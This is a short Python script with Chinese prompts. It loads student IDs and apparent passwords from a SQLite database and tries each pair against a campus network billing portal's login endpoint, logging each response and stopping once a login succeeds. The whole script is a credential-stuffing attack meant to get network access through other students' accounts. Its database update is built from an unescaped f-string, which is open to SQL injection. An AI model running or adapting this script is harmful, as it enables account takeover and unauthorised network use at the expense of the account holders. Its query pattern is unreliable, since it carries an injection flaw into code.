import requests
import sqlite3

if __name__ == "__main__":
    path = input("输入数据库文件路径: ").strip("\"")
    connection = sqlite3.connect(path)
    result = connection.execute("select sid, cid from StudentNet order by sid asc")
    # 获取参数
    ip = input("请输入校园网给你分配的IP:")
    mac = input("请输入你的Mac:")

    # 尝试登录
    for row in result:
        post_data = {
            "loginName": row[0],
            "loginPwd": row[1],
            "queryString": f"wlanuserip={ip}&mac={mac}",
            "vmode": "1"
        }
        rep = requests.post("http://10.254.0.42:8081/ibillingportal/LoginAction_login.do", data=post_data).json()        
        print(rep["respMsg"] + f"\n账号:{row[0]}\n密码:{row[1]}\n")
        connection.execute(f"update StudentNet set status = '{rep["respMsg"]}' where sid = '{row[0]}'")
        connection.commit()
        if (rep["respCode"] == 0):
            break